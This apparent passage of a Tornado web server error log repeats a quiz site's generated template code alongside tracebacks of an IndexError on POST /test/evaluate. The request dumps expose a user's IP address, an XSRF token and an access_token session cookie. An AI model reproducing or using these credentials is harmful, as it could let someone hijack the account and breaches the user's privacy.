 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059e23f8e4c854802b2dbc0&answers=%5B3%5D&cursor=3&_xsrf=bd8b9e9c35f14e82aa50cef195e8a87c', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.68603880.1347963502.1347968284.1348067779.3; __utmz=188782963.1347963502.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFIdmd6WkJ4T0lIVlpDTTl2QjZ6ekg4WERtc3lXbEtBWFQ4eFV4VllQNWJ2WUZaQ2NoQjNsUUhqUW92SG5QT1RjUmVqWkFMcHdSRFNONHgyUGs4YUU2SHQzMDc3UndaRFpE|1347964154|3874870678214437131524f117558b4ec38def3b; _xsrf=bd8b9e9c35f14e82aa50cef195e8a87c; __utmb=188782963.4.10.1348067779; __utmc=188782963', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 98.72ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059e23f8e4c854802b2dbc0&answers=%5B1%2C2%5D&cursor=13&_xsrf=bd8b9e9c35f14e82aa50cef195e8a87c', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '97', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.68603880.1347963502.1347968284.1348067779.3; __utmz=188782963.1347963502.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFIdmd6WkJ4T0lIVlpDTTl2QjZ6ekg4WERtc3lXbEtBWFQ4eFV4VllQNWJ2WUZaQ2NoQjNsUUhqUW92SG5QT1RjUmVqWkFMcHdSRFNONHgyUGs4YUU2SHQzMDc3UndaRFpE|1347964154|3874870678214437131524f117558b4ec38def3b; _xsrf=bd8b9e9c35f14e82aa50cef195e8a87c; __utmb=188782963.4.10.1348067779; __utmc=188782963', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 77.69ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
